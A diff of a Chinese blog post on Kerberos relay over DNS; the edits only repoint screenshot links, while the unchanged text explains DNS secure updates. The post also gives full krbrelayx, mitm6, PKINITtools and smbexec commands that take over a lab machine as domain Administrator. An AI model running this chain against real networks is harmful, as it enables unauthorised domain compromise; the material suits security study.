@@ -20,7 +20,7 @@ layout: post
 
 但是，重用凭据有一个很大的缺陷。如果攻击者可以欺骗用户连接到他们控制的服务器，这种自动身份验证可能会成为问题。攻击者可以诱导用户的网络客户端启动身份验证过程并重用这些信息对不相关的服务进行身份验证，从而允许攻击者以用户身份访问该服务的资源。当以这种方式捕获身份验证消息并将其转发到另一个系统时，它被称为身份验证中继（Relay）攻击。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220426203905996.png)
+![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220426203905996.png)
 
 NTLM Relay 是最经典的身份验证中继攻击，其最早由 Dead Cow 的 Josh Buchbinder 于 2001 年发布。然而，即使在 2021 年，NTLM Relay 攻击仍然是 Windows 域网络配置的重要威胁。
 
@@ -76,7 +76,7 @@ Kerberos 票据授予服务（TGS）使用 SPN 为身份验证生成的 Kerberos
 
 DNS 是一个拥有有效 Kerberos 基础架构的关键组件。在 Active Directory 中，DNS 支持使用 Kerberos 在 DNS 上进行身份验证的操作。这是 “[Secure Dynamic Update](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961412(v=technet.10)?redirectedfrom=MSDN)” 操作的一部分，用于使具有动态地址的网络客户端的 DNS 记录在其网络状态发生更改时能与其当前的 IP 地址保持同步。下图中显示了 DNS 动态更新过程中涉及的几个步骤：
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220426203926963.png)
+![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220426203926963.png)
 
 （1）在步骤 1 中，客户端查询本地名称服务器以确定哪个服务器对其所处的区域具有权威性。本地名称服务器以区域名称和对该区域具有权威性的主服务器地址进行响应。
 
@@ -92,15 +92,15 @@ DNS 是一个拥有有效 Kerberos 基础架构的关键组件。在 Active Dire
 
 如下 WireShark 抓包结果显示了上述过程：
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220425194942795.png)
+![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220425194942795.png)
 
 让我们仔细看看第 83 和第 84 个数据包，其对应上述步骤 3。TKEY 协商消息实际上是通过 TCP 进行发送的，因为它比 UDP 允许的最大 512 字节大很多。这主要是因为其中包含了相当大的 TKEY 附加记录，比如我们经常看到的用于 Kerberos 身份验证的结构：
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220425195522953.png)
+![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220425195522953.png)
 
 可以看到，此查询中包含了一个完整的 GSS-API 和 SPNEGO 结构，其中包含 Kerberos AP-REQ，其实质是对服务的正常 Kerberos 身份验证流程。服务器的应答消息中将返回一个 GSSAPI 和 SPNEGO 结构，其中包含了 Kerberos AP-REP，以指示认证成功，如下图诉所示。此 AP-REP 包含一个 TSIG 会话密钥，客户端可以使用该密钥进一步签署其 DNS 更新查询。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220425200201333.png)
+![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220425200201333.png)
 
 服务器可以存储密钥和经过身份验证的用户/计算机，并以经过身份验证的方式处理更新，而不必将身份验证绑定到特定的 TCP 套接字，因为以后的查询可能通过 UDP 发送。
 
@@ -126,7 +126,7 @@ DNS 是一个拥有有效 Kerberos 基础架构的关键组件。在 Active Dire
 python3 krbrelayx.py --target http://adcs.pentest.com/certsrv/ -ip 172.26.10.134 --victim win10-client1.pentest.com --adcs --template Machine
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220426144651930.png)
+![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220426144651930.png)
 
 （2）然后执行以下命令设置 mitm6，使用 AD CS 主机的名称作为认证目标：
 
@@ -134,11 +134,11 @@ python3 krbrelayx.py --target http://adcs.pentest.com/certsrv/ -ip 172.26.10.134
 mitm6 --domain pentest.com --host-allowlist win10-client1.pentest.com --relay adcs.pentest.com -i eth0 -v
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220426144748831.png)
+![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220426144748831.png)
 
 现在，我们可以等待受害者获得 IPv6 地址并连接到我们的恶意服务器。如下图所示，成功为机器账户 `WIN10-CLIENT1$` 的申请到了证书，该证书适用 Base64 加密。
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220426174232847.png)
+![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220426174232847.png)
 
 （3）我们将该证书的内容保存在 win10-client1.txt 文件中，有了这个证书，我们可以使用 [PKINITtools](https://github.com/dirkjanm/PKINITtools) 或 [Rubeus](https://github.com/GhostPack/Rubeus) 工具，代表该机器账户执行 Kerberos 身份验证，并为其申请 TGT 票据：
 
@@ -146,7 +146,7 @@ mitm6 --domain pentest.com --host-allowlist win10-client1.pentest.com --relay ad
 python3 gettgtpkinit.py pentest.com/win10-client1\$ win10-client1.ccache -pfx-base64 $(cat win10-client1.txt)
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220426195532151.png)
+![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220426195532151.png)
 
 （4）至此我们已经获取了 TGT 票据，但是该票据为 WIN10-CLIENT1 机器账户的票据。由于机器账户不允许登录，我们无法通过机器账户对目标主机执行交互式操作。不过我们可以通过 Kerberos 的 S4U2Self 扩展协议，使用已获取的 TGT 为域管理员用户申请针对 `cifs/win10-client1.pentest.com@pentest.com` SPN 的服务票据，相关命令如下：
 
@@ -156,7 +156,7 @@ python3 gettgtpkinit.py pentest.com/win10-client1\$ win10-client1.ccache -pfx-ba
 python3 gets4uticket.py kerberos+ccache://pentest.com\\win10-client1\$:win10-client1.ccache@dc01.pentest.com cifs/win10-client1.pentest.com@pentest.com Administrator@pentest.com Administrator.ccache -v
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220426195701175.png)
+![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220426195701175.png)
 
 （5）最后，我们通过设置环境变量 `KRB5CCNAME` 来使用 Administrator 用户的票据，并通过 smbexec.py 获取  WIN10-CLIENT1 机器的最高权限，相关命令如下。
 
@@ -165,7 +165,7 @@ export KRB5CCNAME=/root/PKINITtools/Administrator.ccache
 python3 smbexec.py -k pentest.com/Administrator@win10-client1.pentest.com -no-pass
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220426195846775.png)
+![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220426195846775.png)
 
 ## Ending......
 
